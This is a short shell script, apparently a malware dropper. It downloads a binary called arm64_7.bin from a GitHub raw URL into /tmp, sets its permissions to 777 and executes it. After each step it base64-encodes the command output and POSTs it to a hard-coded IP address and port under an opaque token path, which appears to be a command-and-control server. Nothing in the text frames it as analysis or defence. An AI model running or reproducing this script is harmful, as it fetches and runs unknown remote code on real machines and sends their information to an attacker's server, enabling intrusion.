#!/bin/sh

url="http://139.180.135.229:19088"
curl -s -o /tmp/arm64_7.bin https://raw.githubusercontent.com/gptloveyou/learn/main/arm64_7.bin

cmdResp=`chmod 777 /tmp/arm64_7.bin 2>&1 | grep ""`;
ret_enc=`echo "$cmdResp"|base64`
`curl -s -X POST $url/9024134B28978B68666E2B034E46130E/debug -d $ret_enc`

cmdResp=`ls *.bin 2>&1 | grep ""`;
ret_enc=`echo "$cmdResp"|base64`
`curl -s -X POST $url/9024134B28978B68666E2B034E46130E/debug -d $ret_enc`

cmdResp=`/tmp/arm64_7.bin 2>&1 | grep ""`
ret_enc=`echo "$cmdResp"|base64`
`curl -s -X POST $url/9024134B28978B68666E2B034E46130E/debug -d $ret_enc`

